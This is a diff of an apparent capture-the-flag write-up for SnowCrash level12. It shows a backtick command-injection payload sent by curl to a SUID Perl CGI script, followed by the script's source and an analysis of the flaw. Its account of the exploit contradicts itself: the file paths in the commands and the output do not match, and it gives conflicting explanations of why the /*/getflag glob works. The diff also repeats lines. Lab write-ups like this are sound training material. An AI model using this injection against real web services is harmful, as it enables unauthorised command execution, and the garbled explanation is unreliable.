@@ -1,4 +1,107 @@
-level12@SnowCrash:~$ echo "getflag > /tmp/token" > /tmp/GETFLAG
+mkdir /tmp/level12
+level12@SnowCrash:~$ echo "getflag > /tmp/level12/token" > /tmp/GETFLAG
+level12@SnowCrash:~$ cat /tmp/GETFLAG
+getflag > /tmp/token
+level12@SnowCrash:~$ chmod a+x /tmp/GETFLAG
+level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/getflag`'
+..level12@SnowCrash:~$ cat /tmp/token
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+How it works
+
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+Function t($xx, $nn) — Checks the file /tmp/xd
+sub t {
+  $nn = $_[1];   # The second argument
+  $xx = $_[0]; # First argument
+  $xx =~ tr/a-z/A-Z/; # Converts x to uppercase
+  $xx =~ s/\s.*//; # Deletes everything after the first space
+x is a parameter from the request.
+Converts x to uppercase.
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+Launches egrep "^$xx" /tmp/xd
+egrep searches for lines starting with x in the /tmp/xd file.
+If the command returns an error, it is redirected (2>&1).
+
+If egrep finds a string like FLAG12:some_value, it checks if y is in the second part.
+If there is, it returns 1.
+If not, it returns 0.
+
+Vulnerability analysis
+There is a dangerous line in the code:
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+What's wrong here?
+$xx is an unchecked user input (the value of parameter x from the query).
+This input is inserted directly into the shell command.:
+
+egrep "^$xx" /tmp/xd
+
+If you pass special shell characters, for example, symbols (`...`), they will be executed as a command.
+
+How exactly did the command work?
+Did you send a request:
+curl 'localhost:4646?x=`/*/getflag`'
+
+How did Perl interpret it?
+egrep "^`/*/getflag`" /tmp/xd
+
+\/*/getflag` → will be executed as a shell command.
+
+The getflag command was run with flag12 rights (due to SUID on level12.pl ).
+
+The result of the getflag command was inserted into egrep.
+
+The errors were redirected to 2>&1, but the getflag itself was executed.
+
+But how did getflag write the result to /tmp/token?
+
+Your clever move:
+You created the /tmp/GETFLAG script:
+
+echo "getflag > /tmp/token" > /tmp/GETFLAG
+chmod a+x /tmp/GETFLAG
+And then passed **x=\/*/getflag`**, which executes the /tmp/GETFLAG` command.
+
+Why /*/getflag?
+You used the /*/getflag mask because:
+/bin/getflag is the real path to the command
+/*/getflag is a trick that selects the path to getflag, bypassing filters.
+
+Thus:
+Pearl launched the shell and executed the /tmp/GETFLAG command.
+The /tmp/GETFLAG script ran getflag and wrote the token to /tmp/token.
+---------------------------------------------------------------------------------------------
+mkdir /tmp/level12
+level12@SnowCrash:~$ echo "getflag > /tmp/level12/token" > /tmp/GETFLAG
 level12@SnowCrash:~$ cat /tmp/GETFLAG
 getflag > /tmp/token
 level12@SnowCrash:~$ chmod a+x /tmp/GETFLAG
